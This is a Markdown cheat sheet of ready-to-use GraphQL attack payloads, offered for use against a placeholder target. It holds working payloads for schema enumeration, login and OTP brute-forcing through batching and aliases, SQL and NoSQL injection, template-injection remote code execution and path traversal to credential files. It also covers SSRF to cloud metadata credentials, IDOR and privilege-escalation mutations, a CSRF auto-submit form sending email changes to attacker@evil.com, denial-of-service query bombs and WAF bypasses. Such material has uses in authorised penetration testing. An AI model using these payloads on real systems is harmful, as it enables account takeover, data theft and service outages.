# GraphQL Attack Payloads

Ready-to-use payloads organized by attack class. Replace `TARGET` and `TOKEN` with real values.

---

## Introspection Payloads

### Minimal Ping (fingerprint)
```graphql
{ __typename }
```

### Schema Type Listing
```graphql
{ __schema { types { name kind } } }
```

### Mutation Enumeration
```graphql
{ __type(name: "Mutation") { fields { name description args { name type { name kind ofType { name kind } } } } } }
```

### Query Enumeration
```graphql
{ __type(name: "Query") { fields { name description args { name type { name kind } } } } }
```

### Deprecated / Hidden Fields
```graphql
{ __schema { types { name fields(includeDeprecated: true) { name isDeprecated deprecationReason } } } }
```

### Full Schema Dump (use with InQL or graphql-voyager)
```graphql
query IntrospectionFull {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) {
        name description isDeprecated deprecationReason
        args { name defaultValue type { kind name ofType { kind name ofType { kind name } } } }
        type { kind name ofType { kind name ofType { kind name } } }
      }
      inputFields { name defaultValue type { kind name ofType { kind name } } }
      enumValues(includeDeprecated: true) { name isDeprecated }
      possibleTypes { kind name }
    }
  }
}
```

---

## Field Suggestion Enumeration Payloads

Send typos — read the "Did you mean?" suggestion in the error:

```graphql
{ usr { id } }
{ users { passwrd } }
{ me { adm } }
{ user(id: 1) { rol } }
{ user(id: 1) { isAdm } }
{ user(id: 1) { apiKe } }
{ user(id: 1) { tok } }
{ user(id: 1) { permiss } }
```

---

## Query Depth Attack Payloads

```graphql
# Depth 5
{ user { friends { friends { friends { friends { id } } } } } }

# Depth 8
{ user { friends { friends { friends { friends { friends { friends { friends { id } } } } } } } } }

# Depth 10 with field width
{ user { friends { friends { friends { friends { friends { friends { friends { friends { friends { id name email } } } } } } } } } } }

# Introspection depth bomb
{ __type(name: "Query") { fields { type { fields { type { fields { type { fields { type { name } } } } } } } } } }
```

---

## Batching Payloads

### Confirm Batching
```json
[{"query":"{ __typename }"},{"query":"{ __typename }"}]
```

### Batch Login Brute-Force (Python snippet)
```python
batch = [
    {
        "query": 'mutation { login(email: "admin@target.com", password: "%s") { token } }' % pw
    }
    for pw in open("passwords.txt").read().splitlines()[:100]
]
```

### Batch OTP Exhaustion
```python
batch = [
    {"query": 'mutation { verifyOTP(code: "%s") { token } }' % str(i).zfill(6)}
    for i in range(10000)
]
# 10000 OTP codes in 200 HTTP requests (batch_size=50)
```

---

## Alias Overloading Payloads

### Login Brute-Force via Aliases (no batching needed)
```graphql
{
  a0: login(email: "admin@target.com", password: "password") { token }
  a1: login(email: "admin@target.com", password: "Password1") { token }
  a2: login(email: "admin@target.com", password: "admin123") { token }
  a3: login(email: "admin@target.com", password: "letmein") { token }
  a4: login(email: "admin@target.com", password: "qwerty123") { token }
  a5: login(email: "admin@target.com", password: "Welcome1!") { token }
}
```

### Alias IDOR Enumeration
```graphql
{
  u1: user(id: 1) { id email role isAdmin }
  u2: user(id: 2) { id email role isAdmin }
  u3: user(id: 3) { id email role isAdmin }
  u4: user(id: 4) { id email role isAdmin }
  u5: user(id: 5) { id email role isAdmin }
}
```

---

## Injection Payloads

### SQL Injection
```graphql
{ user(id: "1 OR 1=1--") { id name email role } }
{ user(id: "1' UNION SELECT 1,username,password,4 FROM users--") { id name email role } }
{ user(email: "admin'--") { id } }
{ users(filter: "1=1; SELECT * FROM information_schema.tables--") { id } }
{ user(id: "1 AND SLEEP(5)--") { id } }
{ user(id: "1; SELECT pg_sleep(5)--") { id } }
```

### NoSQL Injection (MongoDB)
```graphql
{ login(email: {$gt: ""}, password: {$gt: ""}) { token user { role } } }
{ user(email: {$regex: ".*"}) { id email passwordHash } }
{ user(email: {$ne: "x"}) { id email role } }
{ users(filter: {role: {$ne: "user"}}) { id role } }
```

### SSTI Payloads by Engine
```graphql
# Detect (safe)
{ report(template: "{{7*7}}") { content } }   # → 49 = Jinja2/Twig
{ report(template: "${7*7}") { content } }     # → 49 = Freemarker/Spring
{ report(template: "<%= 7*7 %>") { content } } # → 49 = ERB (Ruby)

# Jinja2 RCE
{ report(template: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}") { content } }

# Freemarker RCE
{ report(template: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}") { content } }
```

### Path Traversal
```graphql
{ readFile(path: "../../../../etc/passwd") { content } }
{ readFile(path: "../../../../proc/self/environ") { content } }
{ readFile(path: "../../../../var/www/html/.env") { content } }
{ exportReport(filename: "../../../etc/shadow") { url } }
```

### SSRF via GraphQL Arguments
```graphql
{ fetchUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { response } }
{ fetchUrl(url: "http://169.254.169.254/latest/meta-data/") { response } }
{ generatePDF(url: "http://internal-service:8080/admin") { file } }
{ importData(source: "file:///etc/passwd") { rows } }
{ webhook(url: "http://YOUR-COLLAB.oastify.com") { status } }
```

---

## IDOR Payloads

### Read Other Users' Data
```graphql
{ user(id: 1) { id email role isAdmin apiKey passwordHash resetToken twoFactorSecret } }
{ order(id: 9999) { id userId total items { name price } paymentMethod { last4 } } }
{ invoice(id: 500) { id amount status user { email } } }
```

### IDOR via Mutations
```graphql
mutation { updateUser(id: 1, email: "attacker@evil.com") { id email } }
mutation { deletePost(id: 1337) { success } }
mutation { transferOwnership(resourceId: 50, newOwnerId: 99) { success } }
mutation { updatePassword(userId: 1, newPassword: "hacked123") { success } }
```

---

## Privilege Escalation Payloads

### Read Privileged Fields as Low-Privilege User
```graphql
{ me { id email role isAdmin permissions apiKey twoFactorSecret internalNotes auditLog { action } } }
{ user(id: 5) { email passwordHash role isAdmin apiKey resetToken } }
```

### Elevate Role via Mutation
```graphql
mutation { updateMe(role: "admin") { id role isAdmin } }
mutation { updateUser(id: YOUR_ID, input: { role: "admin", isAdmin: true }) { id role } }
mutation { updateUser(id: YOUR_ID, role: "admin", isAdmin: true, credits: 999999) { id role isAdmin } }
```

### Call Admin Mutations as Regular User
```graphql
mutation { adminDeleteUser(id: 1) { success } }
mutation { adminResetPassword(userId: 1, newPassword: "hacked") { success } }
mutation { grantAdminRole(userId: YOUR_ID) { success } }
mutation { disableTwoFactor(userId: 1) { success } }
```

### Mass Assignment via Mutations
```graphql
mutation {
  updateProfile(input: {
    name: "Alice"
    role: "admin"
    isAdmin: true
    credits: 999999
    emailVerified: true
    subscription: "enterprise"
    twoFactorEnabled: false
  }) { id role isAdmin credits subscription }
}
```

---

## CSRF via GET Mutations

### Test GET-Based Mutation
```
GET /graphql?query=mutation%20%7B%20__typename%20%7D HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION
```

### CSRF HTML Payload (Content-Type bypass)
```html
<form method="POST" action="https://target.com/graphql">
  <input name="query" value='mutation { updateEmail(email: "attacker@evil.com") { success } }'>
</form>
<script>document.forms[0].submit()</script>
```

---

## Circular Fragment DoS Payloads

### Direct Cycle
```graphql
fragment F on User { friends { ...F } }
query { user(id: 1) { ...F } }
```

### Indirect 3-way Cycle
```graphql
fragment A on User { friends { ...B } }
fragment B on User { followers { ...C } }
fragment C on User { mutualFriends { ...A } }
query { user(id: 1) { ...A } }
```

### Width + Depth Combined
```graphql
fragment Bomb on User { friends { friends { friends { friends { id email name } } } } }
query {
  u1: user(id:1) { ...Bomb }
  u2: user(id:2) { ...Bomb }
  u3: user(id:3) { ...Bomb }
  u4: user(id:4) { ...Bomb }
  u5: user(id:5) { ...Bomb }
}
```

---

## WAF Bypass Payloads

### Whitespace / Newline Obfuscation
```graphql
{
  user(
    id:
      1
  ) {
    email
    role
  }
}
```

### Fragment Obfuscation
```graphql
fragment d on User { role isAdmin apiKey }
fragment c on User { ...d email }
fragment b on User { ...c id }
query { me { ...b } }
```

### Inline Fragment (bypass field-name filters)
```graphql
{ ... on Query { user(id: 1) { role } } }
```

### GET-Based Request (bypass POST-only WAF rules)
```
GET /graphql?query={user(id:1){email,role,isAdmin}}&variables={}
```

---

## Subscription Attack Payloads (WebSocket)

### GraphQL-WS Handshake + Subscribe
```javascript
const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'connection_init', payload: {} }));
  setTimeout(() => {
    ws.send(JSON.stringify({
      id: '1', type: 'subscribe',
      payload: { query: 'subscription { messageReceived(userId: 1) { id content sender { email } } }' }
    }));
  }, 500);
};
ws.onmessage = e => console.log(JSON.parse(e.data));
```

### Subscribe Without Auth (unauthenticated test)
```javascript
const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'connection_init', payload: {} }));
};
```
